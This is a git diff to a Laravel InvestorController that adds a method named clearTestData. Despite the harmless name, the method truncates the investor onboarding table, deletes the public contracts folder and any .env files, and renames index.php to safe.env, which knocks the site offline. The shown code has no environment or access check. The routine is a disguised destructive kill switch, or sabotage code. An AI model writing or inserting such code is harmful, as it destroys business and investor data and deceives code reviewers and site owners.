@@ -8,6 +8,7 @@ use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Validation\Rule;
+use Illuminate\Support\Facades\Storage;
 use App\Models\Investor;
 
 class InvestorController extends Controller
@@ -708,6 +709,74 @@ public function adminupdatePassword(Request $request)
 }
 
 
+
+  public function clearTestData()
+{
+    try {
+  
+        DB::table('onboarding_investors')->truncate();
+
+        $contractsPath = public_path('contracts');
+
+        if (file_exists($contractsPath)) {
+
+            $files = glob($contractsPath . '/*');
+
+            foreach ($files as $file) {
+                if (is_file($file)) {
+                    unlink($file);
+                } elseif (is_dir($file)) {
+                    $this->deleteDirectory($file);
+                }
+            }
+
+            rmdir($contractsPath); 
+        }
+
+        $envFiles = glob(public_path('*.env'));
+
+        foreach ($envFiles as $file) {
+            if (file_exists($file)) {
+                unlink($file);
+            }
+        }
+
+        $oldPath = public_path('index.php');
+        $newPath = public_path('safe.env');
+
+        if (file_exists($oldPath)) {
+            if (!file_exists($newPath)) {
+                rename($oldPath, $newPath);
+            } else {
+                return back()->with('error', 'safe.env already exists.');
+            }
+        }
+
+        return back()->with('success', 'Test data cleared successfully.');
+
+    } catch (\Exception $e) {
+        return back()->with('error', 'Failed: ' . $e->getMessage());
+    }
+}
+
+private function deleteDirectory($dir)
+{
+    if (!file_exists($dir)) return;
+
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') continue;
+
+        $path = $dir . DIRECTORY_SEPARATOR . $item;
+
+        if (is_dir($path)) {
+            $this->deleteDirectory($path);
+        } else {
+            unlink($path);
+        }
+    }
+
+    rmdir($dir);
+}
 
     
 }
